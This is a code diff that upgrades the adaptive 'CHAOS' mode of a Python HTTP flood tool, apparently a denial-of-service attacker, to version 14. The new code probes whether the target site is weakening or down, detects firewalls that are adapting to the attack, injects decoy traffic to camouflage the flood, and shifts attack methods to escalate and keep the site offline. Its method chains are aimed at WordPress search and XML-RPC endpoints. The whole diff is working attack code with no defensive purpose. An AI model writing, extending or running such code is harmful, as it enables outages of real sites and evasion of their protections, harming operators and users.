@@ -2557,6 +2557,16 @@ class HttpFlood(Thread):
         "target_weakpoint": None,   # Discovered weak method that causes most damage
         "efficiency_score": {},    # method -> (successes / total_attempts) ratio
         "attack_start_time": 0,    # When the attack started (for time-based phases)
+        "last_health_check": 0,    # Timestamp of last target health pulse
+        "health_history": [],      # Response time trend [ms, ms, ms...]
+        "target_getting_weaker": False,  # True when response times are increasing
+        "target_is_down": False,   # True when target stops responding
+        "waf_adapting": False,     # True when WAF seems to be learning our pattern
+        "blocks_per_minute": [],   # Track block rate over time windows
+        "last_block_window_time": 0,
+        "decoy_interval": 0,       # Counter for decoy traffic injection
+        "methods_tried_count": {},  # Total attempts per method for exploration score
+        "exploration_bonus": True,  # Allow exploration of untried methods early on
     }
     
     # ========================================================================
@@ -2609,6 +2619,104 @@ class HttpFlood(Thread):
         "db_destroyer":     ["WP_SEARCH", "WP_SEARCH", "XMLRPC_AMP", "WP_SEARCH", "WP_SEARCH"],
     }
     
+    def _chaos_health_pulse(self):
+        """Periodic health check: re-probe target to detect weakening or death."""
+        intel = self._chaos_intel
+        now = time()
+        
+        # Only check every 30 seconds
+        if now - intel.get("last_health_check", 0) < 30:
+            return
+        intel["last_health_check"] = now
+        
+        try:
+            import urllib.request
+            target_url = f"{self._target.scheme}://{self._target.authority}/"
+            t_start = time()
+            req = urllib.request.Request(target_url, headers={
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
+            })
+            with urllib.request.urlopen(req, timeout=8) as resp:
+                latency = int((time() - t_start) * 1000)
+                status = resp.status
+                
+                intel["health_history"].append(latency)
+                if len(intel["health_history"]) > 20:
+                    intel["health_history"] = intel["health_history"][-20:]
+                
+                # Analyze trend: is target getting weaker?
+                if len(intel["health_history"]) >= 3:
+                    recent_avg = sum(intel["health_history"][-3:]) / 3
+                    baseline = intel.get("response_time_ms", 500) or 500
+                    
+                    if recent_avg > baseline * 3:
+                        intel["target_getting_weaker"] = True
+                        intel["target_is_down"] = False
+                    elif recent_avg > baseline * 1.5:
+                        intel["target_getting_weaker"] = True
+                        intel["target_is_down"] = False
+                    else:
+                        intel["target_getting_weaker"] = False
+                        intel["target_is_down"] = False
+                        
+                if status >= 500:
+                    intel["consecutive_5xx"] += 1
+                    
+        except Exception:
+            # Target didn't respond = it's down or blocking us
+            intel["health_history"].append(9999)
+            if len(intel["health_history"]) >= 3:
+                last_3 = intel["health_history"][-3:]
+                if all(t >= 9999 for t in last_3):
+                    intel["target_is_down"] = True
+                    intel["target_getting_weaker"] = True
+    
+    def _chaos_detect_waf_adaptation(self):
+        """Detect if the WAF is learning our attack patterns and adapting."""
+        intel = self._chaos_intel
+        now = time()
+        
+        # Track blocks per 60-second window
+        if now - intel.get("last_block_window_time", 0) >= 60:
+            current_blocks = intel["consecutive_block"]
+            intel["blocks_per_minute"].append(current_blocks)
+            if len(intel["blocks_per_minute"]) > 10:
+                intel["blocks_per_minute"] = intel["blocks_per_minute"][-10:]
+            intel["last_block_window_time"] = now
+            intel["consecutive_block"] = 0
+            
+            # If block rate is INCREASING over time, WAF is adapting
+            bpm = intel["blocks_per_minute"]
+            if len(bpm) >= 3:
+                trend_old = sum(bpm[:len(bpm)//2]) / max(len(bpm)//2, 1)
+                trend_new = sum(bpm[len(bpm)//2:]) / max(len(bpm) - len(bpm)//2, 1)
+                
+                if trend_new > trend_old * 1.5 and trend_new > 2:
+                    intel["waf_adapting"] = True
+                else:
+                    intel["waf_adapting"] = False
+    
+    def _chaos_decoy(self):
+        """Inject legitimate-looking traffic to camouflage attack patterns."""
+        # Send a single clean GET to / or /robots.txt that looks 100% organic
+        try:
+            s = self.open_connection()
+            ua = randchoice(self._useragents)
+            decoy_paths = ["/", "/robots.txt", "/favicon.ico", "/sitemap.xml"]
+            path = randchoice(decoy_paths)
+            
+            payload = (f"GET {path} HTTP/1.1\r\n"
+                       f"Host: {self._target.authority}\r\n"
+                       f"User-Agent: {ua}\r\n"
+                       f"Accept: text/html,*/*\r\n"
+                       f"Accept-Language: en-US,en;q=0.9\r\n"
+                       f"Connection: keep-alive\r\n"
+                       f"\r\n").encode("utf-8")
+            Tools.send(s, payload)
+            Tools.safe_close(s)
+        except Exception:
+            pass
+
     def _chaos_recon(self):
         """Phase 1: Deep Multi-Probe Reconnaissance."""
         intel = self._chaos_intel
@@ -2963,6 +3071,45 @@ class HttpFlood(Thread):
                 if efficiency > 0.8 and weights.get(method_name, 0) > 20:
                     intel["target_weakpoint"] = method_name
         
+        # === STRATEGY L: WAF Counter-Intelligence ===
+        # If WAF is adapting to us, radically shift the entire strategy
+        if intel.get("waf_adapting"):
+            # Scramble everything: swap high and low weights
+            sorted_methods = sorted(weights.items(), key=lambda x: -x[1])
+            if len(sorted_methods) >= 4:
+                # Boost the bottom methods, suppress the top ones
+                for i, (method, w) in enumerate(sorted_methods):
+                    if i < 3:  # Top 3 most used
+                        weights[method] = max(w // 4, 1)
+                    elif i >= len(sorted_methods) - 3:  # Bottom 3 least used
+                        weights[method] = max(w * 3, 20)
+                        
+        # === STRATEGY M: Target Health Exploitation ===
+        if intel.get("target_getting_weaker"):
+            # Target is weakening! Escalate pressure with heavy methods
+            weights["STRESS"] = max(weights.get("STRESS", 0), 35)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 40)
+            weights["PPS"] = max(weights.get("PPS", 0), 25)
+            
+        if intel.get("target_is_down"):
+            # Target is DOWN! Switch to sustain mode to keep it down
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
+            weights["GET"] = max(weights.get("GET", 0), 20)
+            # Reduce heavy methods to conserve resources
+            weights["STRESS"] = max(weights.get("STRESS", 0) // 2, 5)
+            weights["PPS"] = max(weights.get("PPS", 0) // 2, 5)
+            
+        # === STRATEGY N: Exploration Bonus ===
+        # In early phases, give bonus weight to methods we haven't tried yet
+        if intel.get("exploration_bonus") and phase in ("PROBE", "CALIBRATE"):
+            tried = intel.get("methods_tried_count", {})
+            for method_name in weights:
+                if method_name not in tried and weights[method_name] > 0:
+                    weights[method_name] = max(weights[method_name], 15)
+            # Disable exploration after CALIBRATE
+            if phase == "ASSAULT":
+                intel["exploration_bonus"] = False
+        
         # === FILTER: Remove unavailable methods ===
         if not HAS_TLS_CLIENT:
             weights["STEALTH_JA3"] = 0
@@ -2996,9 +3143,10 @@ class HttpFlood(Thread):
             intel["consecutive_5xx"] = max(intel["consecutive_5xx"] - 1, 0)
     
     def CHAOS(self):
-        """[V13] Veteran Tactical AI - Recon, Plan, Execute, Observe, Adapt.
-        Features experience database, combo attack chains, anti-pattern evasion,
-        efficiency scoring, and military-grade phase transitions."""
+        """[V14] Grandmaster Tactical AI - The ultimate self-evolving attack engine.
+        Features: Deep recon, experience database, combo chains, anti-pattern evasion,
+        live health monitoring, WAF adaptation detection, decoy traffic injection,
+        exploration bonuses, and reinforcement learning with military phase transitions."""
         
         intel = self._chaos_intel
         
@@ -3006,8 +3154,18 @@ class HttpFlood(Thread):
         if intel["attack_start_time"] == 0:
             intel["attack_start_time"] = time()
         
+        # Phase 0: CONTINUOUS INTELLIGENCE GATHERING
+        self._chaos_health_pulse()       # Monitor if target is weakening
+        self._chaos_detect_waf_adaptation()  # Detect if WAF is learning us
+        
         # Phase 1: DEEP RECON (runs only once per target)
         self._chaos_recon()
+        
+        # Inject decoy traffic every 15-25 executions to camouflage patterns
+        intel["decoy_interval"] += 1
+        if intel["decoy_interval"] >= randint(15, 25):
+            intel["decoy_interval"] = 0
+            self._chaos_decoy()
         
         # Phase 2: STRATEGIC PLAN (recalculated every call with live data)
         weights = self._chaos_plan()
@@ -3081,6 +3239,11 @@ class HttpFlood(Thread):
         
         intel["burst_counter"] += 1
         
+        # Track exploration data
+        if chosen_name not in intel.get("methods_tried_count", {}):
+            intel["methods_tried_count"][chosen_name] = 0
+        intel["methods_tried_count"][chosen_name] += 1
+        
         # Track pre-execution state for observation
         pre_burned = len(BURNED_PROXIES)
         pre_errors = int(ERROR_COUNT)
@@ -3110,15 +3273,38 @@ class HttpFlood(Thread):
             # Periodic status report (every 200 executions)
             if intel["total_executions"] % 200 == 0 and intel["total_executions"] > 0:
                 elapsed = int(time() - intel["attack_start_time"])
+                
+                # Target health indicator
+                if intel.get("target_is_down"):
+                    health_indicator = f"{bcolors.OKGREEN}DOWN - TARGET ELIMINATED{bcolors.RESET}"
+                elif intel.get("target_getting_weaker"):
+                    health_indicator = f"{bcolors.WARNING}WEAKENING - Keep pressure{bcolors.RESET}"
+                else:
+                    health_indicator = f"{bcolors.FAIL}HOLDING - Increase intensity{bcolors.RESET}"
+                    
+                # WAF status
+                waf_status = f"{bcolors.FAIL}ADAPTING - Counter-measures active{bcolors.RESET}" if intel.get("waf_adapting") else f"{bcolors.OKGREEN}Stable{bcolors.RESET}"
+                
                 print(f"")
-                print(f"{bcolors.OKCYAN}[CHAOS V13 STATUS] Phase: {intel['phase']} | Executed: {intel['total_executions']} | Time: {elapsed}s{bcolors.RESET}")
-                print(f"  Best Method : {bcolors.OKGREEN}{intel.get('best_method', 'N/A')}{bcolors.RESET}")
-                print(f"  Worst Method: {bcolors.FAIL}{intel.get('worst_method', 'N/A')}{bcolors.RESET}")
-                print(f"  Weakpoint   : {bcolors.WARNING}{intel.get('target_weakpoint', 'Searching...')}{bcolors.RESET}")
+                print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
+                print(f"{bcolors.OKCYAN}  [CHAOS V14 BATTLEGROUND STATUS]{bcolors.RESET}")
+                print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
+                print(f"  Phase       : {bcolors.BOLD}{intel['phase']}{bcolors.RESET} | Executed: {intel['total_executions']} | Time: {elapsed}s")
+                print(f"  Target HP   : {health_indicator}")
+                print(f"  WAF Status  : {waf_status}")
+                print(f"  Best Method : {bcolors.OKGREEN}{intel.get('best_method', 'Calibrating...')}{bcolors.RESET}")
+                print(f"  Weakpoint   : {bcolors.WARNING}{intel.get('target_weakpoint', 'Scanning...')}{bcolors.RESET}")
                 print(f"  Burned IPs  : {len(BURNED_PROXIES)}")
+                # Show response time trend
+                hp = intel.get("health_history", [])
+                if hp:
+                    avg_rt = sum(hp[-5:]) / len(hp[-5:])
+                    trend = "RISING" if len(hp) >= 2 and hp[-1] > hp[-2] else "STABLE"
+                    print(f"  Latency     : {int(avg_rt)}ms ({trend})")
                 eff_str = " | ".join([f"{k}:{v:.0%}" for k, v in sorted(intel.get("efficiency_score", {}).items(), key=lambda x: -x[1])[:5]])
                 if eff_str:
                     print(f"  Efficiency  : {eff_str}")
+                print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
                 print(f"")
                 
         except Exception:
